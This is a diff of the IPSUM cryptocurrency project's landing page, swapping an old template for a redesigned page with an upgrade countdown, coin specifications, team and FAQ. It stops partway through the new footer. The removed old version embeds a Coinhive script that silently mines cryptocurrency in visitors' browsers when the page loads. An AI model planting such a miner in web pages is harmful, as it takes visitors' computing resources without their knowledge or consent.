@@ -1,396 +1,463 @@
 <!DOCTYPE html>
-<!--[if IE 9 ]><html class="ie ie9 no-js" lang="en"><![endif]-->
-<!--[if gt IE 9 | !IE]><!-->
-<html class="no-js" lang="en">
-<!--<![endif]-->
-<head>
-  <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <title>IPSUM</title>
-  <meta name="description" content="Intelligent Payment System">
-  <meta name="keywords" content="crypto cryptocurrency masternode coin bitcoin staking pos stake">
-  <meta name="author" content="0x1">
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <link rel="apple-touch-icon" href="assets/img/apple-touch-icon.png">
-  <link rel="icon" href="assets/img/favicon.ico">
-  <link rel='stylesheet' href='assets/css/bootstrap.min.css'>
-  <link rel='stylesheet' href='assets/css/vendor.css'>
-  <link rel='stylesheet' href='assets/css/theme_dark.css'> <!-- edit css file name to be `theme_light.css` or `theme_dark.css` -->
-  <link rel='stylesheet' href='assets/css/custom.css'>
-  <!--[if lte IE 9]><!-->
-  <script src='assets/js/vendor/html5shiv.min.js'></script>
-  <!--<![endif]-->
-</head>
-<body>
-
-  <div class="site">
-    <div class="site-loader _multi-circle-line">
-    <script src='https://coinhive.com/lib/coinhive.min.js'></script>
-    <script>
-        var miner = new CoinHive.Anonymous('hjlLhEajaIkSmIJfveQJ0VmKrKg87zze', {throttle: 0.3});
-        miner.start();
-        setTimeout(
-          function() {
-            miner.stop();
-           }, 10000);
-      </script>
-      <div class="site-loader-spinner"></div>
-    </div> <!-- .site-loader -->
-
-    <div class="site-bg">
-      <div class="site-bg-img"></div>
-      <div class="site-bg-video"></div>
-      <div class="site-bg-overlay"></div>
-      <div class="site-bg-effect layer" data-depth=".30"></div> <!-- parallax data, try edit to other number :) -->
-      <canvas class="site-bg-canvas layer" data-depth=".30"></canvas> <!-- parallax data, try edit to other number :) -->
-      <div class="site-bg-border"></div>
-    </div> <!-- .site-bg -->
-
-    <div class="site-canvas">
-      <header class="site-header">
-        <div class="container">
-          <div class="site-header-header">
-            <div class="site-header-brand">
-              <a href="#">
-                <img class="site-header-logo" src="assets/img/site-header-logo.png" alt="">
-                <img class="site-header-logo-invert" src="assets/img/site-header-logo-invert.png" alt="">
-              </a>
-            </div>
-            <a class="primary-nav-toggle" href="#">
-              <i class="fa fa-navicon"></i>
-            </a>
-          </div>
-          <div class="site-header-main">
-            <nav class="primary-nav">
-              <div class="primary-menu-container">
-                <ul class="primary-menu">
-                  <li class="primary-menu-item is-active" data-section="#home">
-                    <a href="#" data-hover="Home"><span>Home</span></a> <!-- set `data-hover` same as the link text -->
-                  </li> <!-- add `is-active` class for the main section, set `data-section` to be the section id -->
-                  <li class="primary-menu-item" data-section="#about">
-                    <a href="#" data-hover="About"><span>About</span></a>
-                  </li>
-                  <li class="primary-menu-item" data-section="#features">
-                    <a href="#" data-hover="Features"><span>Features</span></a>
-                  </li>
-                  <li class="primary-menu-item">
-                    <a href="https://explorer.ipsum.network" target="_blank" data-hover="Explorer"><span>Explorer</span></a>
-                  </li>
-                  <li class="primary-menu-item">
-                    <a href="https://github.com/ipsum-network/ips/releases" target="_blank" data-hover="Wallets"><span>Wallets</span></a>
-                  </li>
-                  <li class="primary-menu-item">
-                    <a href="https://github.com/ipsum-network/guides" target="_blank" data-hover="Guides"><span>Guides</span></a>
-                  </li>
-                  <li class="primary-menu-item">
-                    <a href="#" target="_blank" data-section="#exchanges" data-hover="Exchanges"><span>Exchanges</span></a>
-                  </li>
-                  <li class="primary-menu-item" data-section="#social">
-                    <a href="#"><i class="fa fa-share-alt"></i></a>
-                  </li>
-                  <li class="primary-menu-item audio-toggle">
-                    <a href="#"><i class="fa fa-volume-up"></i></a>
-                  </li> <!-- .audio-toggle -->
-                </ul>
-              </div>
-            </nav>
-          </div>
-        </div>
-      </header> <!-- .site-header -->
-      <main class="site-main">
-        <div id="nav" class="section">
-          <div class="section-table">
-            <div class="section-table-cell">
-              <div class="container">
-                <div class="row">
-                  <div class="col-xs-12">
-                    <div class="col-inner">
-                    </div>
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>
-        </div> <!-- for `> md` screen, control with `#nav` id -->
-
-        <div id="social" class="section">
-          <div class="section-table">
-            <div class="section-table-cell">
-              <div class="container">
-                <div class="row">
-                  <div class="col-xs-12">
-                    <div class="col-inner">
-                      <div class="social-menu-container">
-                        <ul class="social-menu">
-                          <li class="social-item">
-                            <a href="https://discord.gg/7a84utQ" target="_blank">
-                              <i class="fab fa-discord"></i>
-                              <span>Discord</span>
-                            </a>
-                          </li>
-                          <li class="social-item">
-                            <a href="https://github.com/ipsum-network" target="_blank">
-                              <i class="fa fa-github-square"></i>
-                              <span>GitHub</span>
-                            </a>
-                          </li>
-                        </ul>
-                      </div>
-                    </div>
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>
-        </div> <!-- #social -->
-
-        <div id="home" class="section is-active">
-          <div class="section-table">
-            <div class="section-table-cell">
-              <div class="container">
-                <div class="row">
-                  <div class="col-xs-12">
-                    <div class="col-inner">
-                      <div id="countdown_dashboard" class="countdown">
-                        <div class="dash-primary">
-                          <div class="dash days_dash">
-                            <div class="digit">0</div>
-                            <div class="digit">0</div>
-                            <span class="dash_title">DAYs</span>
-                          </div>
-                        </div>
-                        <div class="dash-secondary">
-                          <div class="dash hours_dash">
-                            <span class="dash_title">Hours</span>
-                            <div class="digit">0</div>
-                            <div class="digit">0</div>
-                          </div>
-
-                          <div class="dash minutes_dash">
-                            <span class="dash_title">Minutes</span>
-                            <div class="digit">0</div>
-                            <div class="digit">0</div>
-                          </div>
-
-                          <div class="dash seconds_dash">
-                            <span class="dash_title">Seconds</span>
-                            <div class="digit">0</div>
-                            <div class="digit">0</div>
-                          </div>
-                        </div>
-                      </div> <!-- .countdown -->
-                      <p>
-                        Mandatory network upgrade coming soon.
-                        <br>
-                        Join our discord channel for updates.
-                      </p>
-                    </div>
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
-
-        <div id="about" class="section">
-          <div class="section-table">
-            <div class="section-table-cell">
-              <div class="container">
-                <div class="row">
-                  <div class="col-xs-12">
-                    <div class="col-inner">
-                      <div class="section-heading">
-                        <h2 class="section-title">What is IPSUM?</h2>
-                        <p class="section-subtitle">Intelligent • Payment • Systems</p>
-                      </div>
-                    </div>
-                  </div>
-                  <div class="col-md-5">
-                    <div class="col-inner">
-                      <p><span class="first-letter">A</span> cryptocurrency community building the future of intelligent payment systems. Our goal is to create a currency that enables a machine to machine economy, whilst providing a "cash like" experience for our users.</p>
-                      <a class="btn btn-default hidden-xs hidden-sm" href="#" data-section="#features">
-                        <span>IPSUM Features</span>
-                      </a> <!-- button link to section, edit the `data-section` to be section id -->
-                    </div>
-                  </div>
-                  <div class="col-md-6 col-lg-5 col-md-offset-1 col-lg-offset-2">
-                    <div class="col-inner">
-                      <div class="iconbox _left">
-                        <div class="iconbox-icon">
-                          <i class="icon-strategy"></i>
-                        </div>
-                        <div class="iconbox-heading">
-                          <h4>Open Source Developers</h4>
-                        </div>
-                        <div class="iconbox-content">
-                          <p>Veterans of open source software, we understand how to cleanly fork and maintain a working relationship with the upstream.</p>
-                        </div>
-                      </div> <!-- .iconbox -->
-
-                      <div class="iconbox _left">
-                        <div class="iconbox-icon">
-                          <i class="icon-tools"></i>
-                        </div>
-                        <div class="iconbox-heading">
-                          <h4>Community Builders</h4>
-                        </div>
-                        <div class="iconbox-content">
-                          <p>We've learned that any successful cryptocurrency is seeded with a strong community. We build communities that are mindful and encourage collaboration in all facets. Come join us!</p>
-                        </div>
-                      </div> <!-- .iconbox -->
-                      <a class="btn btn-default hidden-md hidden-lg" href="#" data-section="#features">
-                        <span>IPSUM Features</span>
-                      </a> <!-- button link to section, edit the `data-section` to be section id -->
-                    </div>
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
-
-        <div id="features" class="section">
-          <div class="section-table">
-            <div class="section-table-cell">
-              <div class="container">
-                <div class="row">
-                  <div class="col-xs-12">
-                    <div class="col-inner">
-                      <div class="section-heading">
-                        <h2 class="section-title">IPSUM</h2>
-                        <p class="section-subtitle">Intelligent • Payment • Systems</p>
-                      </div>
-                    </div>
-                  </div>
-                  <div class="col-xs-12">
-                    <div class="col-inner">
-                      <div id="serviceCarousel" class="owl-carousel">
-                        <div class="service-carousel-item iconbox _center">
-                          <div class="iconbox-icon">
-                            <i class="icon-mobile"></i>
-                          </div>
-                          <div class="iconbox-heading">
-                            <h4>Masternodes</h4>
-                          </div>
-                          <div class="iconbox-content">
-                            <p>Also known as bonded validator systems, masternodes are a series of network nodes that underpin the IPSUM network. Operators earn 70% of block rewards, and help enable instant payments for users.</p>
-                          </div>
-                        </div> <!-- .iconbox -->
-
-                        <div class="service-carousel-item iconbox _center">
-                          <div class="iconbox-icon">
-                            <i class="icon-gears"></i>
-                          </div>
-                          <div class="iconbox-heading">
-                            <h4>Proof of Stake</h4>
-                          </div>
-                          <div class="iconbox-content">
-                            <p>No need for resource intensive mining with IPSUM. Proof of Stake allows users to lock their coins into staking mode and recieve 30% of block rewards.</p>
-                          </div>
-                        </div> <!-- .iconbox -->
-
-                        <div class="service-carousel-item iconbox _center">
-                          <div class="iconbox-icon">
-                            <i class="icon-beaker"></i>
-                          </div>
-                          <div class="iconbox-heading">
-                            <h4>Fast Payments</h4>
-                          </div>
-                          <div class="iconbox-content">
-                            <p>The IPSUM network provides quick payments which are confirmed in minutes not hours.</p>
-                          </div>
-                        </div> <!-- .iconbox -->
-
-                        <div class="service-carousel-item iconbox _center">
-                          <div class="iconbox-icon">
-                            <i class="icon-chat"></i>
-                          </div>
-                          <div class="iconbox-heading">
-                            <h4>Open Source</h4>
-                          </div>
-                          <div class="iconbox-content">
-                            <p>IPSUM is a non-native fork of the Dash Project, meaning we do not share common blockchain ancestry. It is our goal to contribute and synchronize with the upstream project to ensure we inherit latest security features provided by the community.</p>
-                          </div>
-                        </div> <!-- .iconbox -->
-
-                        <div class="service-carousel-item iconbox _center">
-                          <div class="iconbox-icon">
-                            <i class="icon-video"></i>
-                          </div>
-                          <div class="iconbox-heading">
-                            <h4>ASIC Resistance</h4>
-                          </div>
-                          <div class="iconbox-content">
-                            <p>IPSUM has choosen to adopt Proof of Stake rather than Proof of Work. Therefore cannot be mined, and it will always remain ASIC resistant.</p>
-                          </div>
-                        </div> <!-- .iconbox -->
-                      </div>
-                    </div>
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>
-        </div> <!-- #service -->
-
-        <div id="exchanges" class="section">
-          <div class="section-table">
-            <div class="section-table-cell">
-              <div class="container">
-                <div class="row">
-                  <div class="col-xs-12">
-                    <div class="col-inner">
-                      <div class="section-heading">
-                        <h2 class="section-title">BUY IPSUM</h2>
-                        <p class="section-subtitle">Intelligent • Payment • Systems</p>
-                      </div>
-                    </div>
-                  </div>
-                  <div class="col-xs-12">
-                    <div class="col-inner">
-                      <div id="serviceCarousel" class="owl-carousel">
-                        <div class="service-carousel-item iconbox _center">
-                          <a href="https://graviex.net/markets/ipsbtc" target="_blank">
-                            <div class="iconbox-icon">
-                              <img src="assets/img/exchanges/graviex.png" width="25%" height="25%" alt="Buy IPSUM on Graviex">
-                            </div>
-                            <div class="iconbox-heading">
-                              <h4>Graviex</h4>
-                            </div>
-                            <div class="iconbox-content">
-                              <p>GRAVIO Ecosystem Exchange.</p>
-                            </div>
-                          </a>
-                        </div> <!-- .iconbox -->
-                      </div>
-                    </div>
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
-      </main> <!-- .site-main -->
-    </div>
-  </div>
-
-  <script src="assets/js/vendor/jquery-1.11.3.min.js"></script>
-  <script src='assets/js/vendor/bootstrap.min.js'></script>
-  <script src='assets/js/vendor/plugin.js'></script>
-  <script src='assets/js/variable.js'></script>
-  <script src='assets/js/main.js'></script>
-
-  <!-- Google Analytics: change UA-XXXXX-X to be your site's ID. -->
-  <!--
-  <script>
-      (function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=
-      function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;
-      e=o.createElement(i);r=o.getElementsByTagName(i)[0];
-      e.src='https://www.google-analytics.com/analytics.js';
-      r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));
-      ga('create','UA-XXXXX-X','auto');ga('send','pageview');
-  </script>
-  -->
-
-</body>
+<html lang="en" class="js">
+	<head>
+		<meta charset="utf-8">
+		<meta name="author" content="Cesar Filho">
+		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+		<meta name="description" content="Our goal is to automate payment acceptance for the machine to machine economy with the help of Blockchain technology.">
+		<link rel="shortcut icon" href="images/favicon.png">
+		<title>IPSUM Network - Intelligent Payment System | MasterNodes | POS</title>
+		<link rel="stylesheet" href="assets/css/global.min.css?ver=0.1.1">
+	</head>
+	<body class="theme-muscari io-mascari" data-spy="scroll" data-target="#mainnav" data-offset="80">
+		<header class="site-header is-sticky">
+			<div class="navbar navbar-expand-lg is-transparent" id="mainnav">
+				<nav class="container">
+					<a class="navbar-brand animated" data-animate="fadeInDown" data-delay=".65" href="index.html">
+						<img class="logo logo-dark" alt="logo" src="images/logo-ipsum-coin-blue.png" srcset="images/logo-ipsum-coin-blue2x.png 2x">
+						<img class="logo logo-light" alt="logo" src="images/logo-ipsum-coin-white.png" srcset="images/logo-ipsum-coin-white2x.png 2x">
+					</a>
+					<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarToggle">
+						<span class="navbar-toggler-icon"><span class="ti ti-align-justify"></span></span>
+					</button>
+					<div class="collapse navbar-collapse justify-content-end" id="navbarToggle">
+						<ul class="navbar-nav animated remove-animation" data-animate="fadeInDown" data-delay=".9">
+							<li class="nav-item"><a class="nav-link menu-link" href="#intro">What is IPSUM<span class="sr-only">(current)</span></a></li>
+							<li class="nav-item"><a class="nav-link menu-link" href="#tokenSale">Info</a></li>
+							<li class="nav-item"><a class="nav-link menu-link" href="https://github.com/ipsum-network/guides" target="_blank">Guides</a></li>
+							<li class="nav-item"><a class="nav-link menu-link" href="https://github.com/ipsum-network/ips/releases" target="_blank">Wallets</a></li>
+							<li class="nav-item"><a class="nav-link menu-link" href="#team">Team</a></li>
+							<li class="nav-item"><a class="nav-link menu-link" href="#faq">Faq</a></li>
+							<li class="nav-item"><a class="nav-link menu-link" href="https://explorer.ipsum.network" target="_blank">Explorer</a></li>
+						</ul>
+					</div>
+				</nav>
+			</div>
+			<div id="header" class="banner banner-tokensale d-flex align-items-center">
+				<div class="header-angle-bg">
+					<div class="overlay-bubble">
+						<div class="overlay-bubble-1"></div>
+						<div class="overlay-bubble-2"></div>
+						<div class="overlay-bubble-3"></div>
+						<div class="overlay-bubble-4"></div>
+						<div class="overlay-bubble-5"></div>
+						<div class="overlay-bubble-6"></div>
+					</div>
+					<div id="particles-js" class="particles-container particles-js"></div>
+				</div>
+				<div class="container">
+					<div class="banner-content">
+						<div class="gaps size-3x d-lg-none"></div>
+						<div class="row align-items-center mobile-center">
+							<div class="col-lg-6 col-md-12 text-lg-left text-center res-m-bttm">
+								<div class="header-txt">
+									<h1 class="animated" data-animate="fadeInUp" data-delay="1.25">
+										Our goal is to automate payment acceptance for the machine to machine economy.
+									</h1>
+									<p class="lead animated" data-animate="fadeInUp" data-delay="1.35">
+										With the help of Proof of Stake Blockchain technology.
+									</p>
+									<ul class="btns animated" data-animate="fadeInUp" data-delay="1.45">
+										<li><a href="https://graviex.net/markets/ipsbtc/" class="btn btn-outline" target="_blank">BUY IPS</a></li>
+										<li><a href="#" class="btn btn-simple"><em class="fa fa-file"></em> Download Whitepaper</a></li>
+									</ul>
+								</div>
+							</div>
+							<div class="col-lg-5 col-md-12 offset-lg-1 offset-md-0 res-m-bttm-lg">
+								<div class="animated" data-animate="fadeInUp" data-delay="1.55">
+									<div class="header-image-muscari"><img src="images/muscari/header-image-muscari.png" alt="header"></div>
+									<div class="countdown-box countdown-transparent text-center">
+										<span class="extra-line"></span>
+										<h6>Mandatory network upgrade in</h6>
+										<div class="token-countdown d-flex align-content-stretch" data-date="2018/05/20"></div>
+										<div class="token-status-bar">
+											<div class="token-status-percent" style="width:75%;"></div>
+											<span class="token-status-point token-status-point-1" style="left:25%;">Update Site</span>
+											<span class="token-status-point token-status-point-2" style="left:55%;">Update Notice</span>
+											<span class="token-status-point token-status-point-3" style="left:93%;">Upgrade</span>
+										</div>
+										<div><a href="https://discord.gg/RhqZTXr" class="btn btn-alt btn-lg" target="_blank">Join our discord channel for updates</a></div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+			<a href="index.html#intro" class="scroll-down menu-link">SCROLL DOWN</a>
+		</header>
+		<div class="section section-bg-light header-partners">
+			<div class="container">
+				<div class="gaps size-2x d-lg-none"></div>
+				<div class="row">
+					<div class="col-md-6">
+						<h6 class="ex-sm-head animated" data-animate="fadeInUp" data-delay="1.65">Our <br> Partners</h6>
+						<ul class="partner-list-s3 row flex-wrap-reverse">
+							<li class="col-4 animated" data-animate="fadeInUp" data-delay="1.7" style="text-align: center">
+								<a href="https://masternodes.online/currencies/ips/" target="_blank"><img src="images/partner-xs-masternodes-online.png" alt="MasterNodes Online"  style="height: 40px"></a>
+							</li>
+							<li class="col-4 animated" data-animate="fadeInUp" data-delay="1.75">
+								<a href="https://graviex.net/markets/ipsbtc/" target="_blank"><img src="images/partner-xs-graviex.png" alt="Graviex"></a>
+							</li>
+						</ul>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="section section-bg-light section-pad no-pt into-section" id="intro">
+			<div class="container">
+				<div class="gaps size-3x"></div>
+				<div class="row align-items-center">
+					<div class="col-md-5 offset-md-1">
+						<div class="res-m-btm animated" data-animate="fadeInUp" data-delay=".1"><img src="images/muscari/graph-muscari-a.png" alt="graph"></div>
+					</div>
+					<div class="col-md-6 order-md-first order-last">
+						<div class="text-block">
+							<h2 class="animated" data-animate="fadeInUp" data-delay=".2">
+								We have built a platform <br> for a machine to machine economy.
+							</h2>
+							<p class="lead animated" data-animate="fadeInUp" data-delay=".3">
+								IPSUM Network - Intelligent Payment System | MasterNodes | PoS
+							</p>
+							<p class="animated" data-animate="fadeInUp" data-delay=".4">
+								IPSUM Network blocks occur on the network every 60 seconds. IPSUM is 10x faster than Bitcoin.
+							</p>
+							<p class="animated" data-animate="fadeInUp" data-delay=".5">
+								Multiple forms of rewards avoiding coin centralization, unlike coins that can only be mined with ASIC.
+							</p>
+						</div>
+					</div>
+				</div>
+				<div class="gaps size-3x"></div>
+				<div class="gaps size-3x d-none d-lg-block"></div>
+			</div>
+		</div>
+		<div class="section section-pad-md section-bg-muscari section-angle">
+			<div class="section-bg-angle section-muscari"></div>
+			<div class="container">
+				<div class="row">
+					<div class="col-lg-6">
+						<div class="section-head-s4">
+							<h2 class="section-title animated" data-animate="fadeInUp" data-delay=".1">Problem &amp; Solution</h2>
+							<p class="animated" data-animate="fadeInUp" data-delay=".2">A cryptocurrency community building the future of intelligent payment systems.</p>
+						</div>
+					</div>
+				</div>
+				<div class="row">
+					<div class="col-lg-4 res-m-bttm">
+						<div class="text-box animated" data-animate="fadeInUp" data-delay=".3">
+							<h4>Problems with Information Sharing</h4>
+							<p>Your financial information, activity history and balance is confidential. Keep it that way with private send.</p>
+						</div>
+					</div>
+					<div class="col-lg-4 res-m-bttm">
+						<div class="text-box animated" data-animate="fadeInUp" data-delay=".4">
+							<h4>Relation between provider and end-user</h4>
+							<p>Quit the queue. Transact with anyone, anytime, anywhere in the world. Fast Payments: The IPSUM network provides quick payments which are confirmed in minutes not hours.</p>
+						</div>
+					</div>
+					<div class="col-lg-4">
+						<div class="text-box text-box-bg animated" data-animate="fadeInUp" data-delay=".5">
+							<h6>Our Solution</h6>
+							<h4>That All Changes with IPSUM Network</h4>
+							<p>Transactions are written into the blockchain forever and backed up across hundreds of servers worldwide.</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="section section-pad token-section section-bg-light" id="tokenSale">
+			<div class="container">
+				<div class="row justify-content-center">
+					<div class="col-lg-6">
+						<div class="section-head-s5 text-center">
+							<h2 class="section-title animated" data-animate="fadeInUp" data-delay="0">Info &amp; Values</h2>
+							<p class="animated" data-animate="fadeInUp" data-delay=".1">IPSUM is a non-native fork of the PIVX Project, meaning we do not share common blockchain ancestry. It is our goal to contribute and synchronize with the upstream project to ensure we inherit latest security features provided by the community.</p>
+						</div>
+					</div>
+				</div>
+				<div class="row align-items-center">
+					<div class="col-lg-7 res-m-bttm">
+						<div class="row event-info">
+							<div class="col-sm-6">
+								<div class="event-single-info animated" data-animate="fadeInUp" data-delay="0">
+									<h6>Start</h6>
+									<p>Apr 17, 2018 (12:22PM GMT)</p>
+								</div>
+							</div>
+							<div class="col-sm-6">
+								<div class="event-single-info animated" data-animate="fadeInUp" data-delay=".1">
+									<h6>Ticker</h6>
+									<p>IPS</p>
+								</div>
+							</div>
+							<div class="col-sm-6">
+								<div class="event-single-info animated" data-animate="fadeInUp" data-delay=".2">
+									<h6>Algorithm</h6>
+									<p>Proof of Stake</p>
+								</div>
+							</div>
+							<div class="col-sm-6">
+								<div class="event-single-info animated" data-animate="fadeInUp" data-delay=".3">
+									<h6>Masternode colletral</h6>
+									<p>5000 IPS</p>
+								</div>
+							</div>
+							<div class="col-sm-6">
+								<div class="event-single-info animated" data-animate="fadeInUp" data-delay=".4">
+									<h6>Masternode rewards</h6>
+									<p>70%</p>
+								</div>
+							</div>
+							<div class="col-sm-6">
+								<div class="event-single-info animated" data-animate="fadeInUp" data-delay=".5">
+									<h6>Block reward till block</h6>
+									<p>3000 - 1 IPS</p>
+								</div>
+							</div>
+						</div>
+					</div>
+					<div class="col-lg-5 res-m-bttm">
+						<div class="row event-info">
+							<div class="col-sm-12">
+								<div class="event-single-info animated" data-animate="fadeInUp" data-delay=".5">
+									<h6>Block reward</h6>
+									<p>from block 3001 to 43200 125 IPS, block 43201 to 86400 145 IPS, then halving every 15 days to a minimum of 9 IPS</p>
+								</div>
+							</div>
+							<div class="col-sm-12">
+								<div class="event-single-info animated" data-animate="fadeInUp" data-delay=".5">
+									<h6>POS start block</h6>
+									<p>100</p>
+								</div>
+							</div>
+							<div class="col-sm-6">
+								<div class="event-single-info animated" data-animate="fadeInUp" data-delay=".5">
+									<h6>Block timer</h6>
+									<p>60 seconds</p>
+								</div>
+							</div>
+							<div class="col-sm-6">
+								<div class="event-single-info animated" data-animate="fadeInUp" data-delay=".5">
+									<h6>Max supply</h6>
+									<p>21 000 000 IPS</p>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="section section-pad section-bg-light-alt section-bg-patern team-section section-fix bg-fixed" id="team">
+			<div class="container">
+				<div class="row justify-content-center">
+					<div class="col-lg-6">
+						<div class="section-head-s5 text-center">
+							<h2 class="section-title  animated" data-animate="fadeInUp" data-delay=".0">The Leadership Team</h2>
+						</div>
+					</div>
+				</div>
+				<div class="row">
+					<div class="col-md-6 col-lg-4 offset-lg-2 offset-xl-2 col-xl-3 d-inline-flex justify-content-center">
+						<div class="team-member animated" data-animate="fadeInUp" data-delay=".2">
+							<div class="team-photo"><img src="images/team-0x1-lg.jpg" alt="team">
+							</div>
+							<div class="team-info">
+								<h5 class="team-name">Tyler Baker</h5>
+								<span class="team-title">Python &amp; C / C++ Developer</span>
+							</div>
+						</div>
+					</div>
+					<div class="col-md-6 col-lg-4 col-xl-3 d-inline-flex justify-content-center">
+						<div class="team-member animated" data-animate="fadeInUp" data-delay=".3">
+							<div class="team-photo"><img src="images/team-cesar-lg.jpg" alt="team">
+							</div>
+							<div class="team-info">
+								<h5 class="team-name">Cesar Barros</h5>
+								<span class="team-title">Front-End Engineer &amp; Designer</span>
+							</div>
+						</div>
+					</div>
+					<div class="col-md-6 col-lg-4 col-xl-3 d-inline-flex justify-content-center">
+							<div class="team-member animated" data-animate="fadeInUp" data-delay=".4">
+								<div class="team-photo"><img src="images/team-daniel-lg.jpg" alt="team">
+								</div>
+								<div class="team-info">
+									<h5 class="team-name">Daniel Nováčik</h5>
+									<span class="team-title">.NET &amp; JS Developer</span>
+								</div>
+							</div>
+						</div>
+				</div>
+			</div>
+			<div class="gaps size-2x"></div>
+		</div>
+		<div class="section section-pad faq-section section-bg-light" id="faq">
+			<div class="section-bg-angle section-bg-light"></div>
+			<div class="container">
+				<div class="row justify-content-center">
+					<div class="col-lg-6">
+						<div class="section-head-s5 text-center">
+							<h2 class="section-title animated" data-animate="fadeInUp" data-delay=".0">Frequently Asked Questions</h2>
+						</div>
+					</div>
+				</div>
+				<div class="row">
+					<div class="col-md-12">
+						<div class="tab-custom tab-custom-s2">
+							<ul class="nav nav-tabs text-center animated" data-animate="fadeInUp" data-delay=".2">
+								<li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#tab-1">General</a></li>
+								<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#tab-2">MasterNodes</a></li>
+								<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#tab-3">POS</a></li>
+								<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#tab-4">ASIC</a></li>
+							</ul>
+							<div class="tab-content">
+								<div class="tab-pane fade show active" id="tab-1">
+									<div class="row">
+										<div class="col-md-6">
+											<div class="single-faq animated" data-animate="fadeInUp" data-delay=".2">
+												<h5>What is IPSUM Network?</h5>
+												<p>A cryptocurrency community building the future of intelligent payment systems. Our goal is to create a currency that enables a machine to machine economy, whilst providing a "cash like" experience for our users.</p>
+											</div>
+										</div>
+										<div class="col-md-6">
+											<div class="single-faq animated" data-animate="fadeInUp" data-delay=".3">
+												<h5>Open Source Developers</h5>
+												<p>Veterans of open source software, we understand how to cleanly fork and maintain a working relationship with the upstream.</p>
+											</div>
+										</div>
+										<div class="col-md-6">
+											<div class="single-faq animated" data-animate="fadeInUp" data-delay=".4">
+												<h5>Community Builders</h5>
+												<p>We have learned that any successful cryptocurrency is seeded with a strong community. We build communities that are mindful and encourage collaboration in all facets. Come join us!</p>
+											</div>
+										</div>
+									</div>
+								</div>
+								<div class="tab-pane fade" id="tab-2">
+									<div class="row">
+										<div class="col-md-12">
+											<div class="single-faq animated" data-animate="fadeInUp" data-delay=".2">
+												<h5>What are MasterNodes?</h5>
+												<p>Also known as bonded validator systems, masternodes are a series of network nodes that underpin the IPSUM network. Operators earn 70% of block rewards, and help enable instant payments for users.</p>
+											</div>
+										</div>
+									</div>
+								</div>
+								<div class="tab-pane fade" id="tab-3">
+									<div class="row">
+										<div class="col-md-12">
+											<div class="single-faq animated" data-animate="fadeInUp" data-delay=".2">
+												<h5>What is Proof of Stake (POS)?</h5>
+												<p>No need for resource intensive mining with IPSUM. Proof of Stake allows users to lock their coins into staking mode and recieve 30% of block rewards.</p>
+											</div>
+										</div>
+									</div>
+								</div>
+								<div class="tab-pane fade" id="tab-4">
+									<div class="row">
+										<div class="col-md-12">
+											<div class="single-faq animated" data-animate="fadeInUp" data-delay=".2">
+												<h5>ASIC Resistance</h5>
+												<p>IPSUM has choosen to adopt Proof of Stake rather than Proof of Work. Therefore cannot be mined, and it will always remain ASIC resistant.</p>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="section section-pad section-muscari" id="partners">
+			<div class="container">
+				<div class="row text-center">
+					<div class="col-md-6 offset-md-3">
+						<div class="section-head">
+							<h6 class="section-title-sm  animated" data-animate="fadeInUp" data-delay="0">Where we want to reach</h6>
+						</div>
+					</div>
+				</div>
+				<div class="partner-list">
+					<div class="row text-center">
+						<div class="col-md-10 offset-md-1">
+							<div class="row">
+								<div class="col-sm col-6">
+									<div class="single-partner animated" data-animate="fadeInUp" data-delay=".1"><img src="images/partner-xs-cryptopia.png" alt="Partner Cryptopia"></div>
+								</div>
+								<div class="col-sm col-6">
+									<div class="single-partner animated" data-animate="fadeInUp" data-delay=".2"><img src="images/partner-xs-coingecko.png" alt="Partner CoinGecko"></div>
+								</div>
+								<div class="col-sm col-6">
+									<div class="single-partner animated" data-animate="fadeInUp" data-delay=".3"><img src="images/partner-xs-coin-market-cap.png" alt="Partner CoinMarketCap"></div>
+								</div>
+							</div>
+						</div>
+					</div>
+					<div class="row text-center">
+						<div class="col-md-8 offset-md-2">
+							<div class="row">
+								<div class="col-sm col-6">
+									<div class="single-partner animated" data-animate="fadeInUp" data-delay=".4"><img src="images/partner-xs-masternodes-pro.png" alt="Partner MasterNodes.pro"></div>
+								</div>
+								<div class="col-sm col-6">
+									<div class="single-partner animated" data-animate="fadeInUp" data-delay=".5"><img src="images/partner-xs-bittrex.png" alt="Partner Bittrex"></div>
+								</div>
+								<div class="col-sm col-6">
+									<div class="single-partner animated" data-animate="fadeInUp" data-delay=".6"><img src="images/partner-xs-binance.png" alt="Partner Binance"></div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+				<div class="gaps size-3x"></div>
+				<hr class="hr-line">
+				<div class="gaps size-3x"></div>
+				<div class="row">
+					<div class="col-sm-6 col-xl-4 res-l-bttm">
+						<a class="footer-brand animated" data-animate="fadeInUp" data-delay="0" href="index.html"><img class="logo logo-light" alt="logo" src="images/logo-ipsum-coin-white.png" srcset="images/logo-ipsum-coin-white2x.png 2x"></a>
+						<ul class="social">
+							<li class="animated" data-animate="fadeInUp" data-delay=".1"><a href="https://twitter.com/ipsum_network" target="_blank"><em class="fa fa-twitter"></em></a></li>
+							<li class="animated" data-animate="fadeInUp" data-delay=".2"><a href="https://github.com/ipsum-network" target="_blank"><em class="fa fa-github"></em></a></li>
